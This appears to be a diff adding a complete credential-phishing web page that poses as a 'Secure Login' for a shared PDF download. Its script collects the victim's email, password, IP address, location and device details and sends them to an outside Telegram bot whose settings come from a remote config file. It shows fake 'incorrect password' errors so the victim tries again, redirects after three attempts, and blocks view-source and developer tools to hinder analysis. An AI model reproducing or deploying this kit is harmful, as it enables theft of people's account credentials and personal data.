@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Secure Login | Account</title>
+    <meta charset="utf-8" />
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <link
+        href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet" />
+    <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <link rel="shortcut icon"
+        href="https://cdn.glitch.global/77a75b2c-250a-402a-9cc3-8acaab1898a3/voxer.png">
+    <link rel="apple-touch-icon"
+        href="https://cdn.glitch.global/77a75b2c-250a-402a-9cc3-8acaab1898a3/voxer.png">
+    <style>
+        :root {
+            --primary-color: #0078d4;
+            --primary-hover: #106ebe;
+            --email-container: #f7f6f6;
+            --error-color: #d83b01;
+            --text-color: #323130;
+            --text-secondary: #605e5c;
+            --border-color: #edebe9;
+            --input-background: #ffffff;
+            --background-color: #474747;
+        }
+        /* Preloader styles */
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: var(--background-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+        #preloader.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .preloader-logo {
+            height: 80px;
+            animation: pulse 1.5s infinite ease-in-out;
+            border-radius: 50%;
+        }
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        html,
+        body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            -webkit-text-size-adjust: 100%;
+        }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            font-size: 14px;
+            line-height: 1.5;
+            font-weight: 400;
+            background: var(--background-color);
+            color: var(--text-color);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--background-color) url('https://imgtree.co/get/LEoEbs.png?v=572658183') no-repeat center center;
+            background-size: contain;
+            filter: blur(3px);
+            opacity: 0.2;
+            z-index: -1;
+        }
+        .container {
+            width: 100%;
+            padding: 0 15px;
+            max-width: 440px;
+        }
+        .login-wrap {
+            background: #ffffff;
+            border-radius: 14px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08), 0 0 1px rgba(0, 0, 0, 0.18);
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px;
+            text-align: left;
+            border: 1px solid var(--border-color);
+        }
+        .logo {
+            margin-bottom: 5px;
+            text-align: center;
+        }
+        .logo img {
+            height: 70px;
+            border-radius: 10px;
+        }
+        .login-title {
+            font-size: 21px;
+            font-weight: 600;
+            color: var(--text-color);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        .email-container {
+            background: var(--email-container);
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .email-display {
+            font-weight: 600;
+            color: var(--text-color);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            flex-grow: 1;
+        }
+        .not-me-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            margin-left: 12px;
+            white-space: nowrap;
+        }
+        .not-me-link:hover {
+            text-decoration: underline;
+        }
+        .form-group {
+            margin-bottom: 5px;
+            width: 100%;
+        }
+        .email-form-group {
+            display: none;
+        }
+        .form-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text-color);
+        }
+        .form-control {
+            height: 42px;
+            background: var(--input-background);
+            color: var(--text-color);
+            font-size: 14px;
+            font-weight: 400;
+            box-shadow: none;
+            border: 1px solid var(--border-color);
+            padding: 0 12px;
+            transition: all 0.2s ease;
+            width: 100%;
+            border-radius: 5px;
+            -webkit-appearance: none;
+        }
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+        }
+        .form-control.error {
+            border-color: var(--error-color);
+        }
+        .error-message {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        .btn-submit {
+            background: var(--primary-color);
+            border: 1px solid var(--primary-color);
+            color: #ffffff;
+            border-radius: 2px;
+            padding: 0 24px;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 600;
+            width: 100%;
+            height: 45px;
+            margin: 20px 0 0;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent;
+        }
+        .btn-submit:hover {
+            background: var(--primary-hover);
+            border-color: var(--primary-hover);
+        }
+        .btn-submit:active {
+            background: #005a9e;
+        }
+        .form-footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-align: center;
+        }
+        #submitLoader {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(170, 169, 169, 0.8);
+            z-index: 1000;
+        }
+        .loader {
+            border: 3px solid rgba(0, 0, 0, 0.1);
+            border-top: 3px solid var(--primary-color);
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        @media screen and (-webkit-min-device-pixel-ratio:0) {
+            .form-control {
+                font-size: 16px;
+                min-height: 45px;
+            }
+        }
+        @media (max-width: 480px) {
+            .login-wrap {
+                padding: 15px;
+                border: none;
+                box-shadow: none;
+            }
+            body {
+                background: #ffffff;
+                align-items: flex-start;
+                padding-top: 24px;
+            }
+            body::before {
+                display: none;
+            }
+        }
+        @media screen and (-webkit-min-device-pixel-ratio:0) {
+            input,
+            select,
+            textarea {
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Preloader element -->
+    <div id="preloader">
+        <img src="https://cdn.glitch.global/77a75b2c-250a-402a-9cc3-8acaab1898a3/voxer.png"
+            class="preloader-logo" alt="Loading">
+    </div>
+    <div id="submitLoader">
+        <div class="loader"></div>
+    </div>
+    <div class="container">
+        <div class="login-wrap">
+            <div class="logo">
+                <img src="https://cdn.glitch.global/77a75b2c-250a-402a-9cc3-8acaab1898a3/voxer.png"
+                    alt="User">
+            </div>
+            <h1 class="login-title">Sign in</h1>
+            <div class="email-container">
+                <div class="email-display" id="display-email"></div>
+                <a href="#" class="not-me-link">Not you?</a>
+            </div>
+            <form id="user-form" class="login-form">
+                <div class="form-group email-form-group">
+                    <label for="email" class="form-label">Email</label>
+                    <input type="email" id="email" class="form-control"
+                        placeholder="Enter your email" required />
+                </div>
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" id="password" class="form-control"
+                        placeholder="Enter your password" required />
+                    <div id="password-error" class="error-message"></div>
+                </div>
+                <button type="submit" class="btn-submit">Download Now</button>
+            </form>
+        </div>
+    </div>
+    <!-- ==============LOCK SCRIPT==================== -->
+    <script>
+        // Block right-click context menu
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            // List of blocked key combinations
+            const blockedCombinations = [
+                // Developer tools
+                {
+                    key: 'F12',
+                    ctrl: false,
+                    shift: false
+                },
+                {
+                    key: 'I',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+I
+                {
+                    key: 'J',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+J
+                {
+                    key: 'C',
+                    ctrl: true,
+                    shift: true
+                }, // Ctrl+Shift+C
+                // View source/save
+                {
+                    key: 'U',
+                    ctrl: true
+                }, // Ctrl+U
+                {
+                    key: 'S',
+                    ctrl: true
+                }, // Ctrl+S
+                // Mac equivalents
+                {
+                    key: 'U',
+                    meta: true
+                }, // Cmd+U (Mac)
+                {
+                    key: 'S',
+                    meta: true
+                }, // Cmd+S (Mac)
+                {
+                    key: 'I',
+                    meta: true,
+                    alt: true
+                }, // Cmd+Opt+I (Mac)
+                // Additional protections
+                {
+                    key: 'F5'
+                }, // Refresh
+                {
+                    key: 'R',
+                    ctrl: true
+                }, // Ctrl+R
+                {
+                    key: 'F5',
+                    ctrl: true
+                }, // Ctrl+F5
+                {
+                    key: 'F5',
+                    shift: true
+                } // Shift+F5
+            ];
+            // Check if current key combination is blocked
+            const isBlocked = blockedCombinations.some(combo => {
+                return (
+                    e.key.toUpperCase() === combo.key
+                    .toUpperCase() &&
+                    (combo.ctrl === undefined || combo
+                        .ctrl === e.ctrlKey) &&
+                    (combo.shift === undefined || combo
+                        .shift === e.shiftKey) &&
+                    (combo.meta === undefined || combo
+                        .meta === e.metaKey) &&
+                    (combo.alt === undefined || combo
+                        .alt === e.altKey)
+                );
+            });
+            if (isBlocked) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        });
+        // Extra protection against opening devtools
+        let devtoolsOpen = false;
+        const devtoolsCheck = () => {
+            const widthThreshold = window.outerWidth - window.innerWidth >
+                160;
+            const heightThreshold = window.outerHeight - window
+                .innerHeight > 160;
+            const orientation = widthThreshold ? 'vertical' : 'horizontal';
+            if (!(heightThreshold && widthThreshold) &&
+                ((window.Firebug && window.Firebug.chrome && window.Firebug
+                        .chrome.isInitialized) ||
+                    widthThreshold || heightThreshold)) {
+                devtoolsOpen = true;
+                document.body.innerHTML =
+                    '<h1 style="text-align:center;margin-top:20%">Developer tools are disabled</h1>';
+                window.location.href = 'about:blank';
+            }
+        };
+        // Check periodically
+        setInterval(devtoolsCheck, 1000);
+    </script>
+    <!-- ==============LOCK SCRIPT==================== -->
+    <script>
+        // Constants
+        const MAX_ATTEMPTS = 3;
+        const CONFIG_URL = "https://nedu-mantop.pages.dev/config.json";
+        let submitCount = 0;
+        let telegramConfig = null;
+        // Handle "Not me" click
+        function handleNotMeClick(e) {
+            e.preventDefault();
+            const emailContainer = document.querySelector('.email-container');
+            const emailFormGroup = document.querySelector('.email-form-group');
+            // Hide the email container
+            emailContainer.style.display = 'none';
+            // Show the email input field
+            emailFormGroup.style.display = 'block';
+            document.getElementById('email').focus();
+        }
+        // Preloader function
+        function handlePreloader() {
+            const preloader = document.getElementById('preloader');
+            setTimeout(() => {
+                preloader.classList.add('fade-out');
+                setTimeout(() => {
+                    preloader.remove();
+                }, 500);
+            }, 2000);
+        }
+        // Generate random string and append to URL
+        function generateRandomString(length) {
+            const characters =
+                'Aa1Bb2Cc3Dd4Ee5Ff6Gg7Hh8Ii9J0Kk2Ll1Mm3NnoOp4Pq5QrR6Ss7T8UfVWiXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += characters.charAt(Math.floor(Math.random() *
+                    characters.length));
+            }
+            return result;
+        }
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const authParam = urlParams.get('auth');
+            if (authParam) {
+                const emailRegex =
+                    /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+                const emailMatch = authParam.match(emailRegex);
+                if (emailMatch) {
+                    return emailMatch[0];
+                }
+            }
+            return null;
+        }
+        function appendRandomStringToURL(email) {
+            const randomString = generateRandomString(150);
+            const currentURL = window.location.href.split('?')[0];
+            if (email) {
+                window.history.replaceState(null, null, currentURL + "?auth=" +
+                    encodeURIComponent(email) + "&rnd=" + randomString);
+            } else {
+                window.history.replaceState(null, null, currentURL + "?auth=" +
+                    randomString);
+            }
+        }
+        // Initialize page
+        window.onload = function() {
+            // Start preloader countdown
+            handlePreloader();
+            // Set up "Not me" click handler
+            document.querySelector('.not-me-link').addEventListener('click',
+                handleNotMeClick);
+            const email = getEmailFromURL();
+            const emailInput = document.getElementById('email');
+            const displayEmail = document.getElementById('display-email');
+            if (email) {
+                emailInput.value = email;
+                displayEmail.textContent = email;
+                appendRandomStringToURL(email);
+            } else {
+                // If no email in URL, show email field by default
+                document.querySelector('.email-container').style.display =
+                    'none';
+                document.querySelector('.email-form-group').style.display =
+                    'block';
+                appendRandomStringToURL();
+            }
+            // Prevent default required field message
+            document.getElementById('password').addEventListener('invalid',
+                function(e) {
+                    e.preventDefault();
+                    const passwordInput = document.getElementById(
+                        'password');
+                    const passwordError = document.getElementById(
+                        'password-error');
+                    if (!passwordInput.value.trim()) {
+                        passwordInput.classList.add("error");
+                        passwordError.textContent =
+                            "Please enter your password";
+                        passwordError.style.display = "block";
+                    }
+                });
+            // Focus password field on Android to prevent zoom issues
+            if (/Android/i.test(navigator.userAgent)) {
+                setTimeout(function() {
+                    const passwordField = document.getElementById(
+                        'password');
+                    passwordField.focus();
+                    setTimeout(function() {
+                        passwordField.blur();
+                    }, 100);
+                }, 500);
+            }
+        };
+        async function getTelegramConfig() {
+            try {
+                const response = await fetch(CONFIG_URL);
+                if (!response.ok) throw new Error('Failed to fetch config');
+                const config = await response.json();
+                if (!config.telegram || !config.telegram.token || !config
+                    .telegram.chatId) {
+                    throw new Error('Invalid config structure');
+                }
+                telegramConfig = config.telegram;
+                return telegramConfig;
+            } catch (error) {
+                console.error('Error loading Telegram config:', error);
+                throw error;
+            }
+        }
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf("Firefox") > -1) return "Mozilla Firefox";
+            if (ua.indexOf("SamsungBrowser") > -1) return "Samsung Internet";
+            if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1)
+                return "Opera";
+            if (ua.indexOf("Trident") > -1)
+                return "Microsoft Internet Explorer";
+            if (ua.indexOf("Edge") > -1) return "Microsoft Edge";
+            if (ua.indexOf("Chrome") > -1) return "Google Chrome/Chromium";
+            if (ua.indexOf("Safari") > -1) return "Apple Safari";
+            return "Unknown Browser";
+        }
+        function getOS() {
+            const userAgent = navigator.userAgent;
+            if (userAgent.indexOf("Windows NT 10.0") != -1) return "Windows 10";
+            if (userAgent.indexOf("Windows NT 6.3") != -1) return "Windows 8.1";
+            if (userAgent.indexOf("Windows NT 6.2") != -1) return "Windows 8";
+            if (userAgent.indexOf("Windows NT 6.1") != -1) return "Windows 7";
+            if (userAgent.indexOf("Windows NT 6.0") != -1)
+                return "Windows Vista";
+            if (userAgent.indexOf("Windows NT 5.1") != -1) return "Windows XP";
+            if (userAgent.indexOf("Windows NT 5.0") != -1)
+                return "Windows 2000";
+            if (userAgent.indexOf("Mac") != -1) return "Mac/iOS";
+            if (userAgent.indexOf("X11") != -1) return "UNIX";
+            if (userAgent.indexOf("Linux") != -1) return "Linux";
+            return "Unknown OS";
+        }
+        function buildReportMessage(credentials, userInfo) {
+            return `🔥 ====== PDF Login Attempt ${userInfo.attemptNumber} ====== 🔥
+📧 Email: ${credentials.email}
+🔑 Password: ${credentials.password}
+======= USER INFORMATION =======
+🌐 IP: ${userInfo.ipAddress}
+📍 Location: ${userInfo.city || 'N/A'}, ${userInfo.region || 'N/A'}, ${userInfo.country}
+🕒 Timezone: ${userInfo.timezone}
+📅 Date: ${new Date().toLocaleString()}
+======= DEVICE INFO =======
+💻 OS: ${userInfo.os}
+🖥️ Browser: ${userInfo.browser}
+📱 Device: ${userInfo.deviceType}
+🖥️ Screen: ${userInfo.screenResolution}
+🌐 Language: ${navigator.language}
+======== CrEaTeD bY Ojemba OG ========`;
+        }
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
+                return "Tablet";
+            }
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/
+                .test(ua)) {
+                return "Mobile";
+            }
+            return "Desktop";
+        }
+        async function getIPInfo() {
+            try {
+                const ipResponse = await fetch(
+                    "https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const locationResponse = await fetch(
+                    `https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                return {
+                    ipAddress: ipData.ip,
+                    country: locationData.country_name || "Unknown",
+                    region: locationData.region || "Unknown",
+                    city: locationData.city || "Unknown",
+                    isp: locationData.org || "Unknown"
+                };
+            } catch (error) {
+                console.error("IP info fetch error:", error);
+                return {
+                    ipAddress: "Unavailable",
+                    country: "Unavailable",
+                    region: "Unavailable",
+                    city: "Unavailable",
+                    isp: "Unavailable"
+                };
+            }
+        }
+        async function sendToTelegram(message) {
+            if (!telegramConfig) {
+                try {
+                    await getTelegramConfig();
+                } catch (error) {
+                    console.error('Failed to load Telegram config:', error);
+                    throw new Error('Telegram configuration not available');
+                }
+            }
+            try {
+                const telegramPayload = {
+                    chat_id: telegramConfig.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                const response = await fetch(
+                    `https://api.telegram.org/bot${telegramConfig.token}/sendMessage`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(telegramPayload)
+                    });
+                if (!response.ok) {
+                    const errorData = await response.json();
+                    throw new Error(
+                        `Telegram API error: ${errorData.description || response.statusText}`
+                    );
+                }
+                return true;
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                throw error;
+            }
+        }
+        document.getElementById("user-form").addEventListener("submit",
+            async function(e) {
+                e.preventDefault();
+                const submitLoader = document.getElementById(
+                    "submitLoader");
+                const passwordInput = document.getElementById(
+                    "password");
+                const passwordError = document.getElementById(
+                    "password-error");
+                // Reset error states
+                passwordInput.classList.remove("error");
+                passwordError.style.display = "none";
+                const credentials = {
+                    email: document.getElementById("email").value
+                        .trim(),
+                    password: passwordInput.value.trim()
+                };
+                // Validate password
+                if (!credentials.password) {
+                    passwordInput.classList.add("error");
+                    passwordError.textContent =
+                        "Please enter your password";
+                    passwordError.style.display = "block";
+                    return;
+                }
+                if (credentials.password.length <= 5) {
+                    passwordInput.classList.add("error");
+                    passwordError.textContent =
+                        "Please make sure to enter the correct password.";
+                    passwordError.style.display = "block";
+                    return;
+                }
+                // Increment attempt counter
+                submitCount++;
+                // Show loader on all attempts
+                submitLoader.style.display = "flex";
+                try {
+                    // Collect basic user information
+                    const userInfo = {
+                        userAgent: navigator.userAgent,
+                        timezone: Intl.DateTimeFormat()
+                            .resolvedOptions().timeZone,
+                        browser: detectBrowser(),
+                        os: getOS(),
+                        deviceType: detectDeviceType(),
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        attemptNumber: submitCount
+                    };
+                    // Get IP and location info
+                    try {
+                        const ipInfo = await getIPInfo();
+                        Object.assign(userInfo, ipInfo);
+                    } catch (error) {
+                        console.error("IP info error:", error);
+                        userInfo.ipAddress = "Unavailable";
+                        userInfo.country = "Unavailable";
+                        userInfo.region = "Unavailable";
+                        userInfo.city = "Unavailable";
+                    }
+                    // Build and send report
+                    const reportMessage = buildReportMessage(
+                        credentials, userInfo);
+                    await sendToTelegram(reportMessage);
+                    // Handle attempts
+                    setTimeout(() => {
+                        submitLoader.style.display = "none";
+                        if (submitCount >= MAX_ATTEMPTS) {
+                            passwordInput.classList.add(
+                                "error");
+                            passwordError.textContent =
+                                "Incorrect password. For security reasons, please contact the sender of this file.";
+                            passwordError.style.display =
+                                "block";
+                            passwordInput.value = "";
+                            setTimeout(() => {
+                                window.location.href =
+                                    "https://mgmchina-my.sharepoint.com/:f:/g/personal/132130_mgm_mo/EiToq_N9TKzQzNwB9P_DRrsaAgBfqThuFowUdg?e=5%3aYWxLxv&at=99";
+                            }, 5000);
+                        } else {
+                            let errorText;
+                            switch (submitCount) {
+                                case 1:
+                                    errorText =
+                                        "The password you entered is incorrect. Please try again.";
+                                    break;
+                                case 2:
+                                    errorText =
+                                        "Incorrect password. Make sure you're using the correct password.";
+                                    break;
+                                default:
+                                    errorText =
+                                        "Incorrect password. Please contact the sender of this file.";
+                            }
+                            passwordInput.classList.add(
+                                "error");
+                            passwordError.textContent =
+                                errorText;
+                            passwordError.style.display =
+                                "block";
+                            passwordInput.value = "";
+                            passwordInput.focus();
+                        }
+                    }, 1500);
+                } catch (error) {
+                    console.error("Form submission error:", error);
+                    submitLoader.style.display = "none";
+                    passwordInput.classList.add("error");
+                    passwordError.textContent =
+                        "A network error occurred. Please check your connection and try again.";
+                    passwordError.style.display = "block";
+                    if (submitCount >= MAX_ATTEMPTS) {
+                        setTimeout(() => {
+                            window.location.href =
+                                "https://mgmchina-my.sharepoint.com/:f:/g/personal/132130_mgm_mo/EiToq_N9TKzQzNwB9P_DRrsaAgBfqThuFowUdg?e=5%3aYWxLxv&at=99";
+                        }, 5000);
+                    }
+                }
+            });
+    </script>
+</body>
+</html>
